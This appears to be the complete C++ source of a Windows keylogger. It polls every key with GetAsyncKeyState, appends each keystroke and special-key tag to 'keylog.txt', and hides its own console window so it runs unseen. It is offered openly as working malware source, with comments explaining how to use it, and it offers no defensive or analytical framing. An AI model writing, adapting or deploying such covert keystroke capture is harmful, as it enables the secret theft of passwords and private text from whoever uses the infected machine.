/*
This program records keystrokes in a text file called "keylog.txt".
The name of the text file can be edited to any preferance.
*/

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <winuser.h>
#include <string>
#include <fstream> 
#include <iostream>
using namespace std;

/*
This function creates and opens a file called "keylog.txt".
It first checks to see if the file is open, and if it is,
it starts recording the keystrokes to that file. 
*/

void LOG(string keystroke)
{
  fstream logFile;
  logFile.open("keylog.txt", fstream::app);
  if(logFile.is_open())
  {
    logFile << keystroke;
    logFile.close();
  }
}

/*
This bool function is used for the special keys on a keyboard.
If a special key is pressed, the program will refer back to the 
LOG function and it will record the special key that was pressed.
For keys such as the return key or the space key, there won't 
actually be anything logged in the text file. Instead,
you will just see a space in between woprds or a new line being started.
*/

bool SpecialKeys(int S_key)
{
	switch (S_key) 
	{
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_OEM_PERIOD:
		cout << ".";
		LOG(".");
		return true;
	case VK_OEM_COMMA:
		cout << ",";
		LOG(",");
		return true;
	case VK_OEM_7:
		cout << "'";
		LOG("'");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LOCK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW");
		return true;
	default: 
		return false;
	}
}


void keylog()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console window
	char key = 'a';

	while (true)
  	{
		for (int key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
      			{
				if (SpecialKeys(key) == false) //Checks to see if a special key was pressed
        			{
					fstream logFile;
					logFile.open("keylog.txt", fstream::app); //If not, the program records the character key that was pressed
					if (logFile.is_open())
          				{
						logFile << char(key); 
						logFile.close();
					}

				}
			}
		}
	}
}


int main()
{
	keylog();

	return 0;
}
